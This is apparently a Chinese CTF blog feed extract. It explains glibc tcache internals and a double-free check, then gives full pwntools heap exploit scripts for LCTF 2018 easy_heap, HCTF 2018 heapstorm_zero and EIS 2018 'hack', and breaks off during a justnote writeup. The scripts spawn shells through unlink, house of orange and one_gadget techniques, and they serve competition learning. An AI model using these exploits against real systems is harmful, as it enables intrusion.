https://vigneshsrao.github.io/babytcache/ http://tacxingxing.com/2018/02/09/fsp/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>file</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Play With Tcache & LCTF 2018 easy_heap]]></title>
    <url>%2F2018%2F11%2F22%2Fplay-with-tcache%2F</url>
    <content type="text"><![CDATA[tcache简介tcache是在libc 2.27中加入的chunk快速缓存机制。在malloc.c中有如下定义： 共有64个tcache bin。 使用tidx2usize(idx)对tcache的chunk进行大小计算。 每个tcache bin最多存有TCACHE_FILL_COUNT个chunk（默认为7）。 从代码中也可以看出，tcache是线程独立的，每一个线程拥有自己的tcache_perthread_struct结构体，该结构体记录每一个bin的入口和每一个bin中被放入的chunk的数量。 1234567891011121314151617181920212223242526/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];&#125; tcache_perthread_struct; tcache的操作libc中存取tcache中的chunk主要通过tcache_put和tcache_get两个函数实现。在malloc()和free()的本体和马甲中，均有tcache_put和tcache_get的调用。 tcache_put()1234567891011121314151617// malloc.c:2923/* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; // 获取chunk用于保存内容的地址，进行强制类型转换 tcache_entry *e = (tcache_entry *) chunk2mem (chunk); // 对于idx的安全检查 assert (tc_idx &lt; TCACHE_MAX_BINS); // next指针指向对应bin中的第一个chunk e-&gt;next = tcache-&gt;entries[tc_idx]; // 插入对应bin中的第一个地址 tcache-&gt;entries[tc_idx] = e; // 计数加1 ++(tcache-&gt;counts[tc_idx]);&#125; tcache_get()1234567891011121314151617/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; // 获取相应的bin tcache_entry *e = tcache-&gt;entries[tc_idx]; // 对于idx的安全检查 assert (tc_idx &lt; TCACHE_MAX_BINS); // 检测bin是否为空 assert (tcache-&gt;entries[tc_idx] &gt; 0); // 获得chunk tcache-&gt;entries[tc_idx] = e-&gt;next; // 计数减1 --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; __libc_malloc()1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#define checked_request2size(req, sz) \(&#123; \ (sz) = request2size (req); \ if (((sz) &lt; (req)) \ || REQUEST_OUT_OF_RANGE (sz)) \ &#123; \ __set_errno (ENOMEM); \ return 0; \ &#125; \&#125;)void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) // __malloc_hook check return (*hook)(bytes, RETURN_ADDRESS (0));#if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes; // 转换为tbytes checked_request2size (bytes, tbytes); size_t tc_idx = csize2tidx (tbytes); // 计算tcache index MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // idx安全检查，且对应bin非空 &#123; return tcache_get (tc_idx); // 调用tcache_get() &#125; DIAG_POP_NEEDS_COMMENT;#endif if (SINGLE_THREAD_P) &#123; victim = _int_malloc (&amp;main_arena, bytes); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || &amp;main_arena == arena_for_chunk (mem2chunk (victim))); return victim; &#125; arena_get (ar_ptr, bytes); // 否则调用_int_malloc victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) __libc_lock_unlock (ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125; __libc_free()123456789101112131415161718192021222324252627282930313233343536373839404142void__libc_free (void *mem)&#123; mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) // __free_hook check &#123; (*hook)(mem, RETURN_ADDRESS (0)); return; &#125; if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); // 获取chunk的指针 if (chunk_is_mmapped (p)) /* release mmapped memory. */ &#123; /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p)) &#123; mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); &#125; munmap_chunk (p); return; &#125; MAYBE_INIT_TCACHE (); // 初始化tcache ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); // real free&#125; _int_malloc()fastbin123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// malloc.c:3581 if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; // 如果申请的chunk大小在fasbin的范围内 idx = fastbin_index (nb); // 计算fastbin的idx mfastbinptr *fb = &amp;fastbin (av, idx); // 获取对应的fastbin mchunkptr pp; victim = *fb; // 命中的chunk if (victim != NULL) // 如果对应的fastbin中有chunk &#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd; // 取出bin第一个chunk else REMOVE_FB (fb, pp, victim); // 从多线程中移除一个fastbin chunk if (__glibc_likely (victim != NULL)) // 如果命中fastbin chunk &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) // idx安全检查 malloc_printerr ("malloc(): memory corruption (fast)"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); // 将命中的大小的fastbin的剩余chunk放入tcache中（如果对应的tcache还没满） if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); // 放入tcache &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; small bin1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#define first(b) ((b)-&gt;fd)#define last(b) ((b)-&gt;bk) /* If a small request, check regular bin. Since these "smallbins" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) // 如果在smallbin的范围内 &#123; idx = smallbin_index (nb); // 获取smallbin index bin = bin_at (av, idx); // 获取smallbin if ((victim = last (bin)) != bin) // 检查是否有chunk &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) // 检查链表，victiom-&gt;bk-&gt;fd与victim malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; // 取出victim if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ // 将命中的大小的smallbin的剩余chunk放入tcache中（如果对应的tcache还没满） while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); // 没有安全检查 if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; // 取出victim tcache_put (tc_victim, tc_idx); // 放入tcache &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else // 如果不在small bin的范围内 &#123; idx = largebin_index (nb); if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks)) malloc_consolidate (av); &#125; unsorted bin123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193 /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a "small" request. */#if USE_TCACHE INTERNAL_SIZE_T tcache_nb = 0; size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) // 如果大小属于tcache范围 tcache_nb = nb; // 赋值tcache_nb int return_cached = 0; tcache_unsorted_count = 0;#endif for (;; ) &#123; int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; bck = victim-&gt;bk; // 大小检查 if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr ("malloc(): memory corruption"); size = chunksize (victim); /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); /* Take now instead of binning if exact fit */ if (size == nb) // 如果大小正好匹配 &#123; set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) set_non_main_arena (victim);#if USE_TCACHE /* Fill cache first, return to user only if cache fills. We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); // 放入tcache return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125; // if (size == nb) /* place chunk in bin */ // 如果大小不相等，则放入相应的bin中 if (in_smallbin_range (size)) &#123; victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; &#125; else &#123; victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; /* maintain large bins in sorted order */ if (fwd != bck) &#123; /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert (chunk_main_arena (bck-&gt;bk)); if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123; fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; else &#123; assert (chunk_main_arena (fwd)); while ((unsigned long) size &lt; chunksize_nomask (fwd)) &#123; fwd = fwd-&gt;fd_nextsize; assert (chunk_main_arena (fwd)); &#125; if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) /* Always insert in the second position. */ fwd = fwd-&gt;fd; else &#123; victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; &#125; bck = fwd-&gt;bk; &#125; &#125; else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim; &#125; mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim;#if USE_TCACHE /* If we've processed as many chunks as we're allowed while filling the cache, return one of the cached ones. */ ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 /* tcache_unsorted_limit默认0，unlimit */ &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); // 从tcache中返回chunk &#125;#endif#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; &#125;#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) // 有完全匹配的chunk放入tcache后return_cached才会True &#123; return tcache_get (tc_idx); &#125;#endif _int_free()1234567891011121314// malloc.c:4165 _int_free()的最前部位置#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) // idx合法，bin仍有空间 &#123; tcache_put (p, tc_idx); // 放入tcache return; &#125; &#125;#endif Double Free Check昨天听说glibc的git上增加了一个Tcache Double Free的check的commit，就去看了下。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758--- a/malloc/malloc.c+++ b/malloc/malloc.c@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size) typedef struct tcache_entry &#123; struct tcache_entry *next;+ /* This field exists to detect double frees. */+ struct tcache_perthread_struct *key; &#125; tcache_entry; /* There is one of these for each thread, which contains the@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) &#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS);++ /* Mark this chunk as "in the tcache" so the test in _int_free will+ detect a double free. */+ e-&gt;key = tcache;+ e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx) assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]);+ e-&gt;key = NULL; return (void *) e; &#125; @@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock) &#123; size_t tc_idx = csize2tidx (size); + /* Check to see if it's already in the tcache. */+ tcache_entry *e = (tcache_entry *) chunk2mem (p);++ /* This test succeeds on double free. However, we don't 100%+ trust it (it also matches random payload data at a 1 in+ 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence+ before aborting. */+ if (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))+ &#123;+ tcache_entry *tmp;+ LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);+ for (tmp = tcache-&gt;entries[tc_idx];+ tmp;+ tmp = tmp-&gt;next)+ if (tmp == e)+ malloc_printerr ("free(): double free detected in tcache 2");+ /* If we get here, it was a coincidence. We've wasted a few+ cycles, but don't abort. */+ &#125;+ if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) 在tcache_entry结构体中增加了key变量用于防止double free。 123456typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key;&#125; tcache_entry; 在tcache_put()中，key会被赋值为tcache，在tcache_get()中key会被置为NULL。 12345678910111213141516171819@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx) &#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS);++ /* Mark this chunk as "in the tcache" so the test in _int_free will+ detect a double free. */+ e-&gt;key = tcache;+ e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx) assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]);+ e-&gt;key = NULL; return (void *) e; &#125; doubule free的check主要是在_int_free()中，如果key的值为tcache，就会对相应的tcache bin进行遍历（防止误伤，如果该chunk的key正好为tcache），如果找到相应的chunk，则报错。 123456789101112131415161718192021222324252627@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock) &#123; size_t tc_idx = csize2tidx (size); + /* Check to see if it's already in the tcache. */+ tcache_entry *e = (tcache_entry *) chunk2mem (p);++ /* This test succeeds on double free. However, we don't 100%+ trust it (it also matches random payload data at a 1 in+ 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence+ before aborting. */+ if (__glibc_unlikely (e-&gt;key == tcache &amp;&amp; tcache))+ &#123;+ tcache_entry *tmp;+ LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);+ for (tmp = tcache-&gt;entries[tc_idx];+ tmp;+ tmp = tmp-&gt;next)+ if (tmp == e)+ malloc_printerr ("free(): double free detected in tcache 2");+ /* If we get here, it was a coincidence. We've wasted a few+ cycles, but don't abort. */+ &#125;+ if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) LCTF 2018 easy_heap才疏学浅，比赛的时候没做出来，又复习了一遍tcache。 当malloc()时，申请的大小正好与unsorted bin中的chunk大小一致时，会被放入tcache。由于tcache只利用前8字节保存链表信息，因此从unsorted bin中被放入tcache的chunk的bk的值仍然被保留。 利用堆块中残留的bk指针的信息，进行unlink攻击（本题构造的也很巧妙，使得写入\x00后，能够将指针地址指回chunk的头部）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# coding=utf-8# 参考Nu1L writeup：https://xz.aliyun.com/t/3341from pwn import *def Add(p, size, content): p.sendlineafter('&gt; ', str(1)) p.sendlineafter('&gt; ', str(size)) p.sendlineafter('&gt; ', content)def Delete(p, idx): p.sendlineafter('&gt; ', str(2)) p.sendlineafter('&gt; ', str(idx))def Show(p, idx): p.sendlineafter('&gt; ', str(3)) p.sendlineafter('&gt; ', str(idx))def pwn(): BIN_PATH = './easy_heap' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: pass for i in range(10): Add(p, 0x20, 'sunichi') Delete(p, 1) for i in range(3, 8): Delete(p, i) Delete(p, 9) Delete(p, 8) Delete(p, 2) Delete(p, 0) for i in range(7): Add(p, 0x20, 'sunichi') p.sendlineafter('&gt; ', str(1)) p.sendlineafter('&gt; ', str(0)) p.sendafter('&gt; ', '') # change lowest byte of chunk address to 0x00 Add(p, 0xf8, '') # off by null byte to let itself can be unlink for i in range(0, 5): Delete(p, i) Delete(p, 6) Delete(p, 5) # trigger unlink Show(p, 8) recv = p.recvuntil('\n', drop=True) + '\x00\x00' libc.address = u64(recv) - (0x7ffff7dcfca0 - 0x7ffff79e4000) print hex(libc.address) for i in range(7): Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Delete(p, 0) Delete(p, 8) Delete(p, 1) Delete(p, 9) Add(p, 0x20, p64(libc.symbols['__free_hook'])[:6]) Add(p, 0x20, 'sunichi') Add(p, 0x20, 'sunichi') Add(p, 0x20, p64(libc.address + 0x4f322)[:6]) Delete(p, 1) p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>lctf</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hctf 2018 heapstorm_zero]]></title>
    <url>%2F2018%2F11%2F21%2Fhctf18-heapstorm%2F</url>
    <content type="text"><![CDATA[本题的关键主要在于通过scanf()调用malloc()申请一个large bin从而触发fastbin的合并获取unsorted bin。当获得了unsorted bin后，就是常规的off by null和house of orange题了。 本题另一麻烦的地方就是在做house of orange时修改unsorted bin的size，需要利用chunk的重叠来实现（在off by null和unlink时，会产生能够利用的指针）。感觉还是tcl，exp写了140行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146# coding=utf-8from pwn import *def Allocate(p, size, content): p.sendlineafter('Choice:', str(1)) p.sendlineafter('size:', str(size)) p.sendafter('content:', content)def Show(p, idx): p.sendlineafter('Choice:', str(2)) p.sendlineafter('index:', str(idx))def Delete(p, idx): p.sendlineafter('Choice:', str(3)) p.sendlineafter('index: ', str(idx))def pwn(): BIN_PATH = './heapstorm_zero' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') for i in range(0x19): if i == 7: Allocate(p, 0x33, '\x00' * 0x30 + '\x00\x01\n') elif i == 15: Allocate(p, 0x10, '\n') else: Allocate(p, 0x30, '\n') Allocate(p, 0x10, '\n') Allocate(p, 0x20, '\n') Allocate(p, 0x30, '\n') for i in range(4, 9): Delete(p, i) # 4 5 6 7 8 p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Delete(p, 3) # 3 payload = 'a' * 0x38 Allocate(p, 0x38, payload) # 3 Allocate(p, 0x20, '\n') # 4 Allocate(p, 0x20, '\n') # 5 Allocate(p, 0x20, '\n') # 6 Delete(p, 4) Delete(p, 9) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Allocate(p, 0x20, '\n') Allocate(p, 0x30, '\n') Allocate(p, 0x20, '\n') Allocate(p, 0x20, '\n') Show(p, 6) p.recvuntil('Content: ') recv = p.recv(6) libc.address = u64(recv + '\x00\x00') - (0x7ffff7dd1b78 - 0x7ffff7a0d000) for i in range(0x15, 0x15+6): Delete(p, i) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Delete(p, 9) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') Show(p, 5) p.recvuntil('Content: ') recv = p.recv(6) heap_chunk_base = u64(recv + '\x00\x00') - 0x540 Allocate(p, 0x20, '\n') Delete(p, 27) for i in range(11, 21): Delete(p, i) for i in range(0, 4): Delete(p, i) Delete(p, 8) Delete(p, 9) Delete(p, 10) p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') # clear the chunk # Attack for i in range(0, 5): Allocate(p, 0x37, 'sunichi\n') Allocate(p, 0x10, 'sunichi\n') for i in range(10): Allocate(p, 0x37, 'sunichi\n') for i in range(0, 4): Delete(p, i) Delete(p, 8) Delete(p, 9) Delete(p, 10) # 10 -&gt; fake file structure Allocate(p, 0x37, 'sunichi!\x31\n') # 10 p.sendline('1' * 0x500) p.recvuntil('Invaild choice!\n') # get unsorted bin # make 0x60 unsorted bin for i in range(4): Allocate(p, 0x37, 'sunichi\n') payload = p64(0) * 4 + p64(0) + p64(0x41) Allocate(p, 0x37, payload + '\n') Delete(p, 5) payload = '/bin/sh\x00' + p64(0x61) payload += p64(libc.address + (0x7ffff7dd1b20 - 0x7ffff7a0d000)) + p64(libc.symbols['_IO_list_all'] - 0x10) payload += p64(0x20) + p64(0x40) Allocate(p, 0x37, payload + '\n') Delete(p, 0) Allocate(p, 0x37, '\x00' * 0x37 + '\n') Delete(p, 11) Allocate(p, 0x37, '\x00' * 0x37 + '\n') Delete(p, 12) payload = p64(0) * 5 + p64(heap_chunk_base + (0x555555757230 - 0x555555756fe0)) Allocate(p, 0x37, payload + '\n') # vtable Delete(p, 13) payload = p64(0) + p64(1) + p64(2) + p64(libc.symbols['system']) Allocate(p, 0x37, payload + '\n') p.sendlineafter('Choice:', str(1)) p.sendlineafter('size:', str(0x17)) p.interactive() p.close()if __name__ == '__main__': pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>hctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EIS 2018 pwn writeup]]></title>
    <url>%2F2018%2F11%2F18%2FEIS18-pwn%2F</url>
    <content type="text"><![CDATA[hack思路与pwnable.kr的unlnk一致，通过unlink操作对栈上的值进行修改，从而将栈劫持到堆上，返回到one_gadget处。可以进行两次泄漏，分别泄漏libc地址和栈地址。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# coding=utf-8from pwn import *def pwn(): BIN_PATH = './hack' DEBUG = 0 context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('210.32.4.16', 13375) elf = ELF(BIN_PATH) libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so') context.log_level = 'debug' p.recvuntil('input address: ') p.sendline(str(elf.got['puts'])) p.recvuntil(str(elf.got['puts']) + ', ') recv = p.recvuntil('\n') libc.address = int(recv, 16) - libc.symbols['puts'] print hex(libc.address) p.recvuntil('Second chance: \n') p.sendline(str(libc.symbols['__environ'])) p.recvuntil(', ') recv = p.recvuntil('\n') stack_address = int(recv, 16) print hex(stack_address) raw_input() p.recvuntil('The address of the node is ') recv = p.recvuntil(', ', drop=True) heap_addr = int(recv, 16) target_address = stack_address - (0xffb3d93c - 0xffb3d884) if DEBUG == 1: one_gadget = [0x3ac5c, 0x3ac5e, 0x3ac62, 0x3ac69, 0x5fbc5, 0x5fbc6] else: one_gadget = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819] payload = p32(libc.address + one_gadget[3]) + p32(heap_addr + 12) + p32(heap_addr + 0x4) + p32(target_address - 0x8) p.recvuntil('fake node now: ') p.send(payload) # EIS&#123;d2954e2d38bf6b2ed3ebfead7bb6cd33&#125; p.interactive() p.close()if __name__ == '__main__': pwn() 师兄说本题这个解法是非预期解，看了出题人的思路后，感觉出题人可能忘了libc中能够泄漏栈地址。 justnote程序实现了一般堆题的功能，有Add()、Edit()和Delete()，在Add()中能将用户输入后的chunk内容打印。申请堆块时固定申请0x100，chunk地址和用户输入的长度也保存在堆上，但是保存的地址进行了异或。 初一看没什么问题，后来经师傅提醒，如果输入最大的负数，就能够进行堆溢出： 12345678910111213new_chunk = (__int64)calloc(0x100uLL, 1uLL);if ( !new_chunk )&#123; puts("memory error, contact admin"); exit(1);&#125;printf("length of note: ", 1LL);length = input_num(); // vulnerableif ( length &lt; 0 ) length = -length;if ( length &gt; 0xFF ) length = 0xFFLL;printf("note: "); 